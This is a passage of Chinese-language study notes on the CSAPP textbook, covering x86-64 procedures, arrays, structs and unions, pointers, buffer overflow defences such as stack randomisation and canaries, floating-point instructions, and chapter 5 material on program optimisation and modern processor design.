数据传送</h4><ul><li>通过栈传递参数时，所有的数据大小都向8的倍数对齐。</li><li>过程Q可以通过寄存器访问参数，有必要的话可以通过栈访问。相应地，如果Q也调用了某个有超过6个参数的函数，它也需要在自己的栈帧中为超过6个的部分参数分配空间。</li></ul><h4 id="3-7-4栈上的局部存储"><a href="#3-7-4栈上的局部存储" class="headerlink" title="3.7.4栈上的局部存储"></a>3.7.4栈上的局部存储</h4><h4 id="3-7-5-寄存器中的局部存储空间"><a href="#3-7-5-寄存器中的局部存储空间" class="headerlink" title="3.7.5 寄存器中的局部存储空间"></a>3.7.5 寄存器中的局部存储空间</h4><ul><li>根据惯例，寄存器%rbx、%rbp和%r12~%r15被划分为<strong>被调用者保存</strong>寄存器。当过程P调用过程Q时，Q必须保存这些寄存器的值，保证它们的值在Q返回到P时与Q被调用时是一样的。过程Q保存一个寄存器的值不变，要么就是根本不去改变它，要么就是把原始值压入栈中，改变寄存器的值，然后在返回前从栈中弹出旧值。</li><li>所有其他的寄存器，除了栈指针%rsp，都分类为<strong>调用者</strong>保存寄存器。这就意味着任何函数都能修改它们。</li></ul><h4 id="3-7-6-递归过程"><a href="#3-7-6-递归过程" class="headerlink" title="3.7.6 递归过程"></a>3.7.6 递归过程</h4><h3 id="3-8数组的分配和访问"><a href="#3-8数组的分配和访问" class="headerlink" title="3.8数组的分配和访问"></a>3.8数组的分配和访问</h3><h4 id="3-8-1-基本原则"><a href="#3-8-1-基本原则" class="headerlink" title="3.8.1 基本原则"></a>3.8.1 基本原则</h4><ul><li>对于数据类型T和整型常数N，声明如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">T A[N];<br></code></pre></div></td></tr></table></figure><p>起始位置表示为$x_A$。这个声明有两个效果。首先，它在内存中分配一个$L*N$字节的连续区域，这里$L$是数据类型T的大小（单位为字节）。</p><p>其次，它引入了标识符A，可以用A来作为指向数组开头的指针，这个指针的值就是$x_A$。可以用0~N-1的整数索引来访问该数组元素。数组元素$i$会被存放在地址为$x_A+L*i$的地方。</p><h4 id="3-8-2-指针运算"><a href="#3-8-2-指针运算" class="headerlink" title="3.8.2 指针运算"></a>3.8.2 指针运算</h4><ul><li><p>C语言允许对指针进行运算，而计算出来的值会根据该指针引用的数据类型的大小进行伸缩。也就是说，如果$p$是一个指向类型为$T$的数据的指针，$p$的值为$x_p$,那么表达式$p+i$的值为$x_p+L*i$，这里$L$是数据类型$T$的大小。</p></li><li><p>单操作数操作符’&amp;’和‘*’可以产生指针和间接引用指针。也就是，对于一个表示某个对象的表达式Expr，&amp;Expr是给出该对象地址的一个指针。对于一个表示地址的表达式AExpr，*AExpr给出该地址处的值。因此，表达式Expr与<em>&amp;Expr是等价的。可以对数组和指针应用数组下标的操作。数组引用A[i]等同于表达式\</em>(A+i)。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611204545720.png" alt="image-20210611204545720"></p></li></ul><h4 id="3-8-3-嵌套的数组"><a href="#3-8-3-嵌套的数组" class="headerlink" title="3.8.3 嵌套的数组"></a>3.8.3 嵌套的数组</h4><ul><li><p>当我们创建数组的数组时，数组分配和引用的一般原则也是成立的。例如，声明</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> A[<span class="hljs-number">5</span>][<span class="hljs-number">3</span>];<br></code></pre></div></td></tr></table></figure></li></ul><p>等价于下面的声明</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">row3_t</span>[<span class="hljs-number">3</span>];<br><span class="hljs-type">row3_t</span> A[<span class="hljs-number">5</span>];<br></code></pre></div></td></tr></table></figure><ul><li>通常来说，对于一个声明如下的数组：</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">T D[R][C];<br></code></pre></div></td></tr></table></figure><p>它的数组元素$D[i][j]$的内存地址为</p><p>D[i][j]=$x_D+L(C*i+j)$</p><h4 id="3-8-4-定长数组"><a href="#3-8-4-定长数组" class="headerlink" title="3.8.4 定长数组"></a>3.8.4 定长数组</h4><h4 id="3-8-5-变长数组"><a href="#3-8-5-变长数组" class="headerlink" title="3.8.5 变长数组"></a>3.8.5 变长数组</h4><h3 id="3-9-异质的数据结构"><a href="#3-9-异质的数据结构" class="headerlink" title="3.9 异质的数据结构"></a>3.9 异质的数据结构</h3><ul><li>C语言提供了两种将不同类型的对象组合到一起创建数据类型的机制：<strong>结构</strong>（structure），用关键字struct来声明，将多个对象集合到一个单位中；<strong>联合</strong>（union），用关键字union来声明，允许使用几种不同的类型来引用一个对象。</li></ul><h4 id="3-9-1-结构"><a href="#3-9-1-结构" class="headerlink" title="3.9.1 结构"></a>3.9.1 结构</h4><ul><li>类似于数组的实现，结构的所有组成部分都存放在内存中一段连续的区域内，而指向结构的指针就是结构第一个字节的地址。</li></ul><h4 id="3-9-2-联合"><a href="#3-9-2-联合" class="headerlink" title="3.9.2 联合"></a>3.9.2 联合</h4><ul><li>联合声明的语法与结构的语法一样，只不过语义相差比较大。它们是用不同的字段来引用相同的内存块。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611223513165.png" alt="image-20210611223513165"></p><ul><li><p>对于类型union U3 * 的指针p，p-&gt;c、p-&gt;i[0]和p-&gt;v引用的都是数据结构的起始位置。还可以观察到，一个联合的总的大小等于它最大字段的大小。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611223834526.png" alt="image-20210611223834526"></p></li><li><p>在这段代码中，我们以一个数据类型来存储联合中的参数，又以另一种数据类型来访问它。结果会是u具有和d一样的位表示，包括符号位字段、指数和尾数。</p></li></ul><h4 id="3-9-3-数据对齐"><a href="#3-9-3-数据对齐" class="headerlink" title="3.9.3 数据对齐"></a>3.9.3 数据对齐</h4><ul><li><p>许多计算机系统对基本数据类型的合法地址做出了一些限制，要求某种类型对象的地址必须是某个值K（通常是2、4或8）的倍数。这种<strong>对齐限制</strong>简化了形成处理器和内存系统之间的硬件设计。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611224958080.png" alt="image-20210611224958080"><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611225008702.png" alt="image-20210611225008702"></p></li></ul><h3 id="3-10-在机器级程序中将控制和数据结合起来"><a href="#3-10-在机器级程序中将控制和数据结合起来" class="headerlink" title="3.10 在机器级程序中将控制和数据结合起来"></a>3.10 在机器级程序中将控制和数据结合起来</h3><h4 id="3-10-1-理解指针"><a href="#3-10-1-理解指针" class="headerlink" title="3.10.1 理解指针"></a>3.10.1 理解指针</h4><ul><li>每个指针都对应一个类型。</li><li>每个指针都有一个值。这个值是某个指定类型的对象的地址。特殊的NULL(0)值表示该指针没有指向任何地方。</li><li>指针用‘&amp;’运算创建。</li><li>操作符用于间接引用指针。其结果是一个值，它的类型与该指针的类型一致。</li><li>数组与指针紧密联系。一个数组的名字可以像一个指针变量一样引用（但是不可以修改）。数组引用（例如a[3]）与指针运算和间接引用（例如*(a+3)）有一样的效果。</li><li>将指针从一种类型转换成另一种类型，只改变它的类型，而不改变它的值。<ul><li>如果p是一个char*类型的指针，它的值为p，那么表达式（int*）p+7计算为p+28，而（int*）(p+7)计算为p+7。（强制类型转换的优先级高于加法）</li></ul></li><li>指针也可以指向函数。<ul><li>函数指针的值是该函数机器代码表示中第一条指令的地址。</li></ul></li></ul><h4 id="3-10-2-应用：使用GDB调试器"><a href="#3-10-2-应用：使用GDB调试器" class="headerlink" title="3.10.2 应用：使用GDB调试器"></a>3.10.2 应用：使用GDB调试器</h4><h5 id="GDB命令示例"><a href="#GDB命令示例" class="headerlink" title="GDB命令示例"></a>GDB命令示例</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611225934057.png" alt="image-20210611225934057"></p><h4 id="3-10-3-内存越界引用和缓冲区溢出"><a href="#3-10-3-内存越界引用和缓冲区溢出" class="headerlink" title="3.10.3 内存越界引用和缓冲区溢出"></a>3.10.3 内存越界引用和缓冲区溢出</h4><ul><li>C对于数组引用不进行任何边界检查，而且局部变量和状态信息都存放在栈中。</li></ul><h5 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h5><ul><li>一种特别常见的状态破坏称为<strong>缓冲区溢出</strong>（buffer overflow）。</li><li>我们的echo代码很简单，但是有点太随意了。更好一点的版本是使用fgets函数，它包括一个参数，限制待读入的最大字节数。<ul><li>使用gets或其他任何能导致存储溢出的函数，都是不好的编程习惯。不幸的是，很多常用的库函数，包括strcpy、strcat和sprintf，都有一个属性——不需要告诉它们目标缓冲区的大小，就产生一个字节序列[97]。这样的情况就会导致缓冲区溢出。</li></ul></li><li>通常，输入给程序一个字符串，这个字符串包含一些可执行代码的字节编码，称为<strong>攻击代码</strong>（exploit code）。</li></ul><h4 id="3-10-4-对抗缓冲区溢出攻击"><a href="#3-10-4-对抗缓冲区溢出攻击" class="headerlink" title="3.10.4 对抗缓冲区溢出攻击"></a>3.10.4 对抗缓冲区溢出攻击</h4><h5 id="1-栈随机化"><a href="#1-栈随机化" class="headerlink" title="1.栈随机化"></a>1.栈随机化</h5><ul><li>栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。实现的方式是：程序开始时，在栈上分配一段0~n字节之间的随机大小的空间。<ul><li>例如，使用分配函数alloca在栈上分配指定字节数量的空间。程序不使用这段空间，但是它会导致程序每次执行时后续的栈位置发生了变化。</li></ul></li><li>分配的范围n必须足够大，才能获得足够多的栈地址变化，但是又要足够小，不至于浪费程序太多的空间。</li></ul><p>一个执着的攻击者总是能够用蛮力克服随机化。</p><ul><li>一种常见的把戏就是在实际的攻击代码前插入很长的一段nop（读作”no op“，no operation的缩写）指令。执行这种指令除了对程序计数器加一，使之指向下一条指令外，没有任何效果。只要攻击者能够猜中这段序列的某个地址，程序就会经过这个序列，到达攻击代码。这个序列常用的术语是”<strong>空操作雪橇</strong>（nop sled）“[97]，意思是程序会”滑过“这个序列。</li></ul><h5 id="2-栈破坏检测"><a href="#2-栈破坏检测" class="headerlink" title="2.栈破坏检测"></a>2.栈破坏检测</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210611231843282.png" alt="image-20210611231843282"></p><h5 id="3-限制可执行代码区域"><a href="#3-限制可执行代码区域" class="headerlink" title="3. 限制可执行代码区域"></a>3. 限制可执行代码区域</h5><ul><li><p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。在典型的程序中，只有保存编译器产生的代码的的那部分内存才需要是可执行的。其他部分可以被限制为只允许读和写。</p></li><li><p>变长数组意味着在编译时无法确定栈帧的大小。</p><p>为了管理变长栈帧，x86-64代码使用寄存器%rbp作为<strong>帧指针</strong>（frame pointer）（有时称为<strong>基指针</strong>（base pointer））。</p><p>然后在函数的整个执行过程中，都使得%rbp指向那个时刻栈的位置，然后用固定长度的局部变量（例如i）相对于%rbp的偏移量来引用它们。</p></li></ul><h3 id="3-11-浮点代码"><a href="#3-11-浮点代码" class="headerlink" title="3.11 浮点代码"></a>3.11 浮点代码</h3><ul><li><p>如图3-45所示，AVX浮点体系结构允许数据存储在16个YMM寄存器中，它们的名字为%ymm0~%ymm15。每个YMM寄存器都是256位（32字节）。当对标量数据操作时，这些寄存器只保存浮点数，而且只使用低32位（对于float）或64位（对于double）。汇编代码用寄存器SSE XMM寄存器名字%xmm0~%xmm15来引用它们，每个XMM寄存器都对应的YMM寄存器的低128位（16字节）。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613202922594.png" alt="image-20210613202922594"></p></li></ul><h4 id="3-11-1-浮点传送和转换操作"><a href="#3-11-1-浮点传送和转换操作" class="headerlink" title="3.11.1 浮点传送和转换操作"></a>3.11.1 浮点传送和转换操作</h4><h5 id="浮点传送指令"><a href="#浮点传送指令" class="headerlink" title="浮点传送指令"></a>浮点传送指令</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613203039064.png" alt="image-20210613203039064" style="zoom:80%;"></p><h5 id="双操作浮点转换指令"><a href="#双操作浮点转换指令" class="headerlink" title="双操作浮点转换指令"></a>双操作浮点转换指令</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613203151849.png" alt="image-20210613203151849"></p><h5 id="三操作数浮点转换指令"><a href="#三操作数浮点转换指令" class="headerlink" title="三操作数浮点转换指令"></a>三操作数浮点转换指令</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613203202598.png" alt="image-20210613203202598"></p><h4 id="3-11-2-过程中的浮点代码"><a href="#3-11-2-过程中的浮点代码" class="headerlink" title="3.11.2 过程中的浮点代码"></a>3.11.2 过程中的浮点代码</h4><ul><li>XMM寄存器用来向函数传递浮点参数，可以看到如下规则：<ul><li>XMM寄存器%xmm0~%xmm7最多可以传递8个浮点参数。按照参数列出的顺序使用这些寄存器，可以通过栈传递额外的浮点参数。</li><li>函数使用寄存器%xmm0来传递浮点值。</li><li>所有的XMM寄存器都是调用者保存的。被调用者可以不用保存就覆盖这些寄存器中任意一个。</li></ul></li></ul><h4 id="3-11-3-浮点运算操作"><a href="#3-11-3-浮点运算操作" class="headerlink" title="3.11.3 浮点运算操作"></a>3.11.3 浮点运算操作</h4><ul><li><p>每条指令有一个（$S_1$）或两个（$S_1,S_2$）源操作数，和一个目的操作数$D$。第一个源操作数$S_1$可以是一个XMM寄存器或一个内存位置。第二个源操作数和目的操作数都必须是XMM寄存器。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613203734649-1623587856033.png" alt="image-20210613203734649"></p></li></ul><h4 id="3-11-4-定义和使用浮点常数"><a href="#3-11-4-定义和使用浮点常数" class="headerlink" title="3.11.4 定义和使用浮点常数"></a>3.11.4 定义和使用浮点常数</h4><ul><li>和整数运算操作不同，AVX浮点操作不能以立即数值作为操作数。相反，编译器必须为所有的常量值分配和初始化存储空间。</li></ul><h4 id="3-11-5-在浮点代码中使用位级操作"><a href="#3-11-5-在浮点代码中使用位级操作" class="headerlink" title="3.11.5 在浮点代码中使用位级操作"></a>3.11.5 在浮点代码中使用位级操作</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613203926808.png" alt="image-20210613203926808"></p><h4 id="3-11-6-浮点比较操作"><a href="#3-11-6-浮点比较操作" class="headerlink" title="3.11.6 浮点比较操作"></a>3.11.6 浮点比较操作</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613204007526.png" alt="image-20210613204007526"></p><ul><li><p>它们遵循以相反顺序列出操作数的ATT格式惯例。参数$S_2$必须在XMM寄存器中，而$S_1$可以在XMM寄存器中，也可以在内存中。</p></li><li><p>浮点比较指令设置三个条件码：零标志位ZF、进位标志位CF和奇偶标志位PF。</p></li><li><p>对于整数操作，当最近的一次算术或逻辑运算产生的值的最低位字节是偶校验的（即这个字节中有偶数个1），那么就会设置这个标志位。不过对于浮点比较，当两个操作数中任一个是NaN时，会设置该位。</p></li><li><p>条件码的设置条件如下：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613204444726.png" alt="image-20210613204444726"></p><p>当任一操作数为NaN时，就会出现<strong>无序的</strong>情况。可以通过奇偶标志位发现这种情况。通常jp(jump on parity)指令时条件跳转，条件就是浮点比较得到一个无序的结果。</p></li></ul><h4 id="3-11-7-对浮点代码的观察结论"><a href="#3-11-7-对浮点代码的观察结论" class="headerlink" title="3.11.7 对浮点代码的观察结论"></a>3.11.7 对浮点代码的观察结论</h4><h3 id="3-12-小结"><a href="#3-12-小结" class="headerlink" title="3.12 小结"></a>3.12 小结</h3><h2 id="第4章-处理器体系结构"><a href="#第4章-处理器体系结构" class="headerlink" title="第4章 处理器体系结构"></a>第4章 处理器体系结构</h2><p>跳过</p><h2 id="第5章-优化程序性能"><a href="#第5章-优化程序性能" class="headerlink" title="第5章 优化程序性能"></a>第5章 优化程序性能</h2><ul><li>编写高效程序需要做到以下几点：<ul><li>第一，我们必须选择一组适当的算法和数据结构。</li><li>第二，我们必须编写出编译器能够有效优化以转换成高效可执行代码的源代码</li></ul></li><li>然而，即使时最好的编译器也会受到<strong>妨碍优化的因素</strong>（optimization blocker）的阻碍，妨碍优化的因素就是程序行为中那些严重依赖于执行环境的方面。</li><li>程序优化的第一步就是消除不必要的工作，让代码尽可能有效的执行所期望的任务。</li><li>了解了处理器的运作，我们就可以进行程序优化的第二步，利用处理器提供的<strong>指令级并行</strong>（instruction-level parallelism）能力，同时执行多条指令。</li><li>正如我们会看到，常常通过确认关键路径（critical path）来决定执行一个循环所需要的时间（或者说，至少是一个时间下界）。所谓关键路径是在循环的反复执行过程中的数据相关链。</li></ul><h3 id="5-1-优化编译器的能力和局限性"><a href="#5-1-优化编译器的能力和局限性" class="headerlink" title="5.1 优化编译器的能力和局限性"></a>5.1 优化编译器的能力和局限性</h3><ul><li>最简单的控制是指定<strong>优化级别</strong>。</li><li>编译器必须很小心地对程序只使用<strong>安全的</strong>优化，也就是说对于程序可能遇到的所有可能的情况，在C语言标准提供的保证之下，优化后得到的程序和未优化的版本有一样的行为。</li><li>两个指针可能指向同一个内存位置的情况称为<strong>内存别名使用</strong>（memory aliasing）。在只执行安全的优化中，编译器必须假设不同的指针可能会指向内存中的同一个位置。<ul><li>这造成了一个主要的<strong>妨碍优化的因素</strong>。</li></ul></li><li>第二个妨碍优化的因素是函数调用。<ul><li>包含函数调用的代码可以用一个称为<strong>内联函数替换</strong>（inline substitution，或者简称”内联（inlining）“）的过程进行优化，此时将函数调用替换为函数体。</li></ul></li></ul><h3 id="5-2-表示程序的性能"><a href="#5-2-表示程序的性能" class="headerlink" title="5.2 表示程序的性能"></a>5.2 表示程序的性能</h3><ul><li><p>我们引入度量标准<strong>每元素的周期数</strong>（Cycles Per Element，CPE），作为一种表示程序性能并指导我们改进代码的方法。</p></li><li><p>函数psum1每次迭代计算结果向量的一个元素。第二个函数使用<strong>循环展开</strong>（loop unrolling）的技术，每次迭代计算两个元素。</p></li></ul><h3 id="5-3-程序示例"><a href="#5-3-程序示例" class="headerlink" title="5.3 程序示例"></a>5.3 程序示例</h3><h3 id="5-4-消除循环的低效率"><a href="#5-4-消除循环的低效率" class="headerlink" title="5.4 消除循环的低效率"></a>5.4 消除循环的低效率</h3><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613214617247.png" alt="image-20210613214617247"></p><ul><li>这个优化是一类常见的优化的一个例子，称为<strong>代码移动</strong>（code motion）。这类优化包括识别要多次执行（例如在循环里）但是计算结果不会改变的计算。因而可以将计算移动到代码前面不会被多次求值的部分。</li></ul><h3 id="5-5-减少过程的调用"><a href="#5-5-减少过程的调用" class="headerlink" title="5.5 减少过程的调用"></a>5.5 减少过程的调用</h3><h3 id="5-6-消除不必要的内存引用"><a href="#5-6-消除不必要的内存引用" class="headerlink" title="5.6 消除不必要的内存引用"></a>5.6 消除不必要的内存引用</h3><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613215006549.png" alt="image-20210613215006549"></p><ul><li><p>按照图5-10中combine4所示的方式重写代码。引入一个临时变量acc，它在循环中用来累积计算出来的值。只有在循环完成之后结果才存放在dest中。正如下面的汇编代码所示，编译器现在可以用寄存器%xmm0来保存累计值。与combine3中的循环相比，我们将每次迭代的内存操作从两次读和一次写减少到只需要一次读。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613215437594.png" alt="image-20210613215437594" style="zoom:67%;"></p></li></ul><h3 id="5-7-理解现代处理器"><a href="#5-7-理解现代处理器" class="headerlink" title="5.7 理解现代处理器"></a>5.7 理解现代处理器</h3><ul><li>当一系列操作必须按照严格顺序执行时，就会遇到<strong>延迟界限</strong>（latency bound），因为在下一条指令开始之前，这条指令必须结束。当代码中的数据相关限制了处理器利用指令级并行的能力时，延迟界限能够限制程序性能。</li><li><strong>吞吐量界限</strong>（throughput bound）刻画了处理器功能单元的原始计算能力。这个界限是程序性能的终极限制。</li></ul><h4 id="5-7-1-整体操作"><a href="#5-7-1-整体操作" class="headerlink" title="5.7.1 整体操作"></a>5.7.1 整体操作</h4><ul><li>整个设计有两个主要部分：<strong>指令控制单元</strong>（ Instruction Control Unit，ICU）和<strong>执行单元</strong>（Execution Unit，EU）。前者负责从内存中读出指令序列，并根据这些指令序列生成一组针对程序数据的基本操作；而后者执行这些操作。</li><li>ICU从<strong>指令高速缓存</strong>（instruction cache）中读取指令，指令高速缓存是一个特殊的高速存储器，它包含最近访问的指令。</li><li><p>现代处理器采用了一种称为<strong>分支预测</strong>（branch predication）的技术，处理器会猜测是否会选择分支，同时还预测分支的目标地址。使用<strong>投机执行</strong>（speculative execution）的技术，处理器会开始取出位于它预测的分支会跳到的地方的指令，并对指令译码，甚至在它确定分支预测是否正确之前就开始取出位于它预测的分支会跳到的地方的指令，并对指令译码，甚至在它确定分支预测是否正确之前就开始执行这些操作。如果过后确定分支预测错误，会将状态重新设置到分支点的状态，并开始取出和执行另一方向上的指令。标记为<strong>取值控制</strong>的块包括分支预测，以完成确定取哪些指令的任务。</p></li><li><p>EU接收来自取指单元的操作。</p></li><li><p>读写内存是由加载和存储单元实现的。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613231550850.png" alt="image-20210613231550850"></p></li><li><p>我们可以看出功能单元的这种组合具有同时执行多个同类型操作的潜力。它有4个功能单元可以执行整数操作，2个单元能执行加载操作，2个单元能执行浮点乘法。</p></li><li>在ICU中，<strong>退役单元</strong>（retirement unit）记录正在进行的处理，并确保它遵守机器级程序的顺序语义。<ul><li>首先，一旦一条指令的操作完成了，而且所有引起这条指令的分支点也都被确认为预测正确，那么这条指令就可以<strong>退役</strong>（retire）了，所有对程序寄存器的更新都可以被实际执行了。另一方面，如果引起该指令的某个分支点预测错误，这条指令就会被<strong>清空</strong>（flushed），丢弃所有计算出来的结果。通过这种方法，预测错误就不会改变程序的状态了。</li></ul></li></ul><h4 id="5-7-2-功能单元的性能"><a href="#5-7-2-功能单元的性能" class="headerlink" title="5.7.2 功能单元的性能"></a>5.7.2 功能单元的性能</h4><ul><li><p>每个运算都是由以下数值来刻画的：</p><ul><li>一个是<strong>延迟</strong>（latency），它表示完成运算所需要的总时间；</li><li>另一个是<strong>发射时间</strong>（issue time），它表示两个连续的同类型的运算之间需要的最小时钟周期数；</li><li>还有一个是<strong>容量</strong>（capacity），它表示能够执行该运算的功能单元的数量。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210613232257891.png" alt="image-20210613232257891" style="zoom:80%;"></p></li><li><p>发射时间为1的功能单元被称为<strong>完全流水线化的</strong>（fully pipelined)；每个时钟周期可以开始一个新的运算。出现容量大于1的运算是由于有多个功能单元。</p></li><li><p>除法器的发射时间等于它的延迟。</p></li><li><p>表达发射时间的一种更常见的方法是指明这个功能单元的最大<strong>吞吐量</strong>，定义为发射时间的倒数。一个完全流水线化的功能单元有最大的吞吐量，每个时钟周期一个运算。</p><ul><li>对一个容量为C，发射时间为I的操作来说，处理器可能获得的吞吐量为每时钟周期C/I个操作。</li></ul></li><li><p>我们用CPE值的两个基本界限来描述这种影响：</p><ul><li><strong>延迟界限</strong>给出了任何必须按照严格顺序完成合并运算的函数所需要的最小CPE值。</li><li><strong>吞吐量界限</strong>给出了CPE的最小界限。</li></ul></li><li><p>另一方面，四个功能单元都可以执行整数加法，处理器就有可能持续每个周期执行4个操作的速率。不幸的是，因为需要从内存读数据，这造成了另一个吞吐量界限。两个加载单元限制了处理器每个时钟周期最多只能读取两个数据值。</p></li></ul><h4 id="5-7-3-处理器操作的抽象类型"><a href="#5-7-3-处理器操作的抽象类型" class="headerlink" title="5.7.3 处理器操作的抽象类型"></a>5.7.3 处理器操作的抽象类型</h4><ul><li>我们会使用程序的<strong>数据流</strong>（data-flow）表示，这是一种图形化的表示方法，展现了不同操作之间的数据相关时如何限制它们的执行顺序的。这些限制形成了图中的<strong>关键路径</strong>（critical path），这是执行一组机器指令所需时钟周期数的一个下界。</li></ul><h5 id="1-从机器级代码到数据流图"><a href="#1-从机器级代码到数据流图" class="headerlink" title="1.从机器级代码到数据流图"></a>1.从机器级代码到数据流图</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210614233612112.png" alt="image-20210614233612112" style="zoom: 80%;"></p><ul><li><p>对于形成循环的代码片段，我们可以将访问到的寄存器分为四类：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210614234326400.png" alt="image-20210614234326400"></p></li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210614234414936.png" alt="image-20210614234414936"></p><ul><li><p>在图5-14b中，表明的是由于循环的一次迭代在循环寄存器中形成的数据相关。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210614234545156.png" alt="image-20210614234545156" style="zoom:67%;"></p></li></ul><h5 id="其他性能因素"><a href="#其他性能因素" class="headerlink" title="其他性能因素"></a>其他性能因素</h5><ul><li>数据流表示中的关键路径提供的只是程序需要周期数的<strong>下界</strong>。还有其他一些因素会限制性能。</li></ul><h3 id="5-8-循环展开"><a href="#5-8-循环展开" class="headerlink" title="5.8 循环展开"></a>5.8 循环展开</h3><ul><li>循环展开是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615161512541.png" alt="image-20210615161512541"></p><ul><li>每条vmulsd指令被翻译成两个操作：一个操作是从内存中加载一个数组元素，另一个是把这个值乘以已有的累积值。</li></ul><h3 id="5-9-提高并行性"><a href="#5-9-提高并行性" class="headerlink" title="5.9 提高并行性"></a>5.9 提高并行性</h3><ul><li>执行加法和乘法的功能单元是完全流水线化的，这意味着它们可以每个时钟周期开始一个新操作，并且有些操作可以被多个功能单元执行。</li></ul><h4 id="5-9-1-多个累积变量"><a href="#5-9-1-多个累积变量" class="headerlink" title="5.9.1 多个累积变量"></a>5.9.1 